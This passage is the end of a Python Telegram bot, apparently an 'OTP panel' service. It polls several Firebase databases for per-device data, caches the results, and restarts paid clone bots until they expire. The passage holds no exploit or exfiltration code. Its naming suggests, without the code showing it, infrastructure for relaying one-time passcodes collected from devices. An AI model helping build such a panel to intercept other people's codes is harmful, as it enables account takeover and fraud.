                if not isinstance(results[i], Exception): GLOBAL_DEVICE_CACHE[tag] = results[i]

            if first_run:
                first_run = False
                tlog("✅ Firebase Polling Engine Started")
            else:
                poll_tasks = [poll_single_db(tag, url) for tag, url in dbs.items()]
                await asyncio.gather(*poll_tasks)
        except Exception as e: tlog(f"Poll Error: {e}")
        await asyncio.sleep(POLL_INTERVAL)

async def start_clone_bot(clone_token: str):
    app = Application.builder().token(clone_token).connection_pool_size(100).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CallbackQueryHandler(on_callback))
    app.add_handler(MessageHandler(filters.TEXT, on_text))
    await app.initialize(); await app.start()
    await app.updater.start_polling(drop_pending_updates=True)
    return app

def main():
    keep_alive()  # Start the lightweight aiohttp Render server
    print("═" * 56)
    print("  🤖 OTP PANEL BOT — SUPREME PREMIUM EDITION v7.0")
    print("═" * 56)
    
    app = Application.builder().token(TOKEN).connection_pool_size(1000).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CallbackQueryHandler(on_callback))
    app.add_handler(MessageHandler(filters.TEXT, on_text))
    app.add_error_handler(global_error_handler)

    async def post_init(application: Application):
        load_data()
        asyncio.create_task(poll_loop(application))
        asyncio.create_task(auto_save_loop())
        asyncio.create_task(cleanup_cooldowns())
        
        # Restore Clones
        for token, d in list(CLONES.items()):
            if time.time() < d.get("expiry", 0):
                try: CLONES[token]["app"] = await start_clone_bot(token)
                except: pass

    app.post_init = post_init
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
